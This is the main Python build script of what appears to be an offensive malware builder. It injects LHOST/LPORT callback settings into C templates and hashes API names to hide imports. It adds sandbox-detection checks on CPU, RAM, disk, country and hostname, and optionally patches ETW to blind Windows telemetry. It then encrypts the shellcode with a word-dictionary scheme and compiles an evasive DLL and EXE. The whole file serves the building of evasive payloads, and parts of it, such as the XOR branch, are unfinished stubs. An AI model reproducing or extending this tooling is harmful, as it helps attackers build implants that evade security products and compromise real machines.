#!/usr/bin/env python3
# PYTHON_ARGCOMPLETE_OK

from configparser import ConfigParser
import random
import sys
import os
from core.encryptor import Encryptor
from core.templator import Templator
from core.configator import check_config_and_merge
from core.utils import get_LCID, round_pow2, format_instructions, hash_obj, hash_obj_null
from core.orchestrator import prepare_build_env, build_dll, build_exe
from core.hasher import *
from core.argparsor import parse_args, get_selected_payload

PAYLOAD_DIR = "src/dll/payloads"
WORKING_FOLDER = "build/"

try:
    import argcomplete
except ImportError:
    argcomplete = None


def main():
    config = ConfigParser()
    config.read(".conf")

    args = parse_args()
    print(args) if args.verbose else None

    args = check_config_and_merge(config, args)

    # logger todo here

    """
    Steps:
        - sed files with config values, checks, evasions, payloads and so (LHOST, LPORT, etc)     -> templator.py
        - encrypt payload with selected method (xor/dict/etc)                                     -> encryptor.py
        - Replace payload in main app
        - build dll                                                                               -> scripts/compile_dll.sh
        - build exe                                                                               -> scripts/compile_exe.sh
    """

    # Ici on est en mode "build" avec exactement 1 payload sélectionné
    # Récupère le nom du payload choisi
    payload = get_selected_payload(args)

    if args.verbose:
        print(f"[i] building with payload='{payload}', output='{args.output}', small={args.small}")

    # Step 0: Prepare build environment
    prepare_build_env() # rm -rf build && mkdir -p build/bin bin && cp -r src include build/


    # Step 1: Replace templates in payload file
    templator = Templator(working_dir="build/", verbose=args.verbose)
    # replace all patterns execpt list of exceptions
    tags_by_file = templator.extract_tags_from_folder("build/", exceptions=["XOR_KEY", "PAYLOAD", "SHELLCODE", "SHELLCODE_DECODER", "PAYLOAD_SIZE"])

    not_replaced_tags = []

    for file in tags_by_file:
        filepath = file["filepath"]
        tags = file["tags"]
        for tag in tags:
            print(f"Processing tag: {tag['raw']} (type: {tag['type']}, name: {tag['name']}") if args.verbose else None
            if tag['replaced']:
                continue
            elif tag['type'] == "MODHASH":
                templator.sed_file(filepath, tag['raw'], hash_obj(tag['name'], "", args.verbose))
            elif tag['type'] == "FCTHASH":
                templator.sed_file(filepath, tag['raw'], hash_obj(tag['name'], "function", args.verbose))

            elif tag['type'] == "SANDBOX":
                if tag['name'] == "CPU_CHECK":
                    if config.getint("Anti-Analysis", "cpu_cores"):
                        check_content = templator.get_template(tag['name'], str(config.getint("Anti-Analysis", "cpu_cores")))
                        templator.sed_file(filepath, tag['raw'], check_content)
                    else:
                        print("No CPU core count for Sandbox detection set in config file. Skipping CPU check.") if args.verbose else None
                        templator.sed_file(filepath, tag['raw'], '/* No CPU check configured */')

                elif tag['name'] == "RAM_CHECK":
                    if config.getint("Anti-Analysis", "ram_size"):
                        check_content = templator.get_template(tag['name'], str(config.getint("Anti-Analysis", "ram_size")))
                        templator.sed_file(filepath, tag['raw'], check_content)
                    else:
                        print("No RAM size for Sandbox detection set in config file. Skipping RAM check.") if args.verbose else None
                        templator.sed_file(filepath, tag['raw'], '/* No RAM check configured */')

                elif tag['name'] == "DISK_CHECK":
                    if config.getint("Anti-Analysis", "disk_size"):
                        check_content = templator.get_template(tag['name'], str(config.getint("Anti-Analysis", "disk_size")))
                        templator.sed_file(filepath, tag['raw'], check_content)
                    else:
                        print("No Disk size for Sandbox detection set in config file. Skipping Disk check.") if args.verbose else None
                        templator.sed_file(filepath, tag['raw'], '/* No Disk check configured */')

                elif tag['name'] == "COUNTRY_CHECK":
                    if config.get("Anti-Analysis", "avoid_countries"):
                        check_content = templator.get_template(tag['name'])
                        templator.sed_file(filepath, tag['raw'], check_content)
                    else:
                        templator.sed_file(filepath, tag['raw'], '// Country check not enabled')

                elif tag['name'] == "AVOID_COUNTRIES":
                    if config.get("Anti-Analysis", "avoid_countries"):
                        countries = config.get("Anti-Analysis", "avoid_countries").split(",")
                        countries_lcid = [str(get_LCID(country.strip())) for country in countries if country.strip()]
                        templator.sed_file(filepath, tag['raw'], "{" + ", ".join(countries_lcid) + "}")
                    else:
                        templator.sed_file(filepath, tag['raw'], "/* No countries to avoid configured */")

                elif tag['name'] == "AVOID_HOSTNAME":
                    if config.get("Anti-Analysis", "avoid_hostname"):
                        res = ""
                        for hostname in config.get("Anti-Analysis", "avoid_hostname").split(","):
                            hostname = hostname.strip()
                            if hostname:
                                res += hash_obj("", hostname, args.verbose) + ","
                        templator.sed_file(filepath, tag['raw'], res[:-1])
                    else:
                        templator.sed_file(filepath, tag['raw'], "/* No hostnames to avoid configured */")

                elif tag['name'] == "TARGET_HOSTNAME":
                    if config.get("Anti-Analysis", "target_hostname"):
                        hashed_hostname = hash_obj("", config.get("Anti-Analysis", "target_hostname"), args.verbose)
                        templator.sed_file(filepath, tag['raw'], hashed_hostname)
                    else:
                        templator.sed_file(filepath, tag['raw'], hash_obj_null())

            elif tag['type'] == "EVASION":
                if tag['name'] == "ETW_PATCHING":
                    if args.etw:
                        templator.sed_file(filepath, tag['raw'], "patch_etw();")
                    else:
                        templator.sed_file(filepath, tag['raw'], "// ETW patching not enabled")

            elif not tag['type']:
                if tag['name'] == "LHOST":
                    if config.get("Payload", "lhost"):
                        templator.sed_file(filepath, tag['raw'], config.get("Payload", "lhost"))
                    else:
                        raise ValueError("LHOST is not set in the configuration (.conf) file.")
                elif tag['name'] == "LPORT":
                    if config.get("Payload", "lport"):
                        templator.sed_file(filepath, tag['raw'], config.get("Payload", "lport"))
                    else:
                        raise ValueError("LPORT is not set in the configuration (.conf) file.")
            else:
                not_replaced_tags.append(tag)

    if not_replaced_tags:
        print("[i] Tags not replaced (may be normal if no config value provided):") if args.verbose else None
        print(tag['name'] for tag in not_replaced_tags) if args.verbose else None
        print(f"Total tags not replaced: {len(not_replaced_tags)}") if args.verbose else None
        sys.exit(0)

    build_dll(payload, verbose=args.verbose)  # bash scripts/compile_dll.sh payload

    # Step 2: Encrypt payload
    if "dict" in config.get("Payload", "encryption_method"):
        with open(f"{PAYLOAD_DIR}/{payload}.c", 'rb') as file:
            content = file.read()
            payload = content.hex()
        encryptor = Encryptor(method="dict", verbose=args.verbose)  # init
        encryptor.set_wordlist("data/words_100000.txt")             # set self.wordlist
        encrypted_payload = encryptor.dict_encrypt(payload)         # get encrypted payload, C formatted
        dict_table = encryptor.get_association_table()              # get C association table
        dict_size = encryptor.get_nb_words()                      # get final size of the dictionary

    elif "xor" in config.get("Payload", "encryption_method"):
        # with open(f"{PAYLOAD_DIR}/{payload}.c", "r") as f:
        #     payload = f.read().encode()
        # encryptor = Encryptor(method="xor", verbose=args.verbose)
        # encryptor.set_key(config.getint("Payload", "encryption_key", fallback=0x1337))
        # encrypted_payload = encryptor.xor_encrypt(payload)
        pass
    else:
        raise ValueError("Unknown encryption method")

    # Step 3: Replace payload in main app

    if "dict" in config.get("Payload", "encryption_method"):
        templator.sed_files("%__XOR_KEY__%", str(random.randint(0, 0xFF)))
        templator.sed_files("%__PAYLOAD_SIZE__%", str(round_pow2(dict_size)))
        templator.sed_files("%__SHELLCODE_DECODER__%", "DICT_decrypt(dict_payload);")
        templator.sed_files("%__SHELLCODE__%", f"unsigned char payload[];\n\n{dict_table}\n\nconst char* dict_payload = {encrypted_payload};")
    elif "xor" in config.get("Payload", "encryption_method"):
        # templator.sed_files("%__PAYLOAD_SIZE__%", str(round_pow2(len(encrypted_payload)//2)))
        # templator.sed_files("%__SHELLCODE_DECODER__%", f"XOR_decrypt(xor_payload, {config.getint('Payload', 'encryption_key', fallback=0x1337)});")
        # templator.sed_files("%__SHELLCODE__%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
        pass

    if args.small:
        templator.sed_files("int WinMain(", "int WinMainCRTStartup(")

    # Step 4: Build EXE
    build_exe(output_file=args.output, prioritize_size=args.small, verbose=args.verbose)  # bash scripts/compile_exe.sh -o <output_file> --prioritize-size <true|false>


if __name__ == "__main__":
    main()
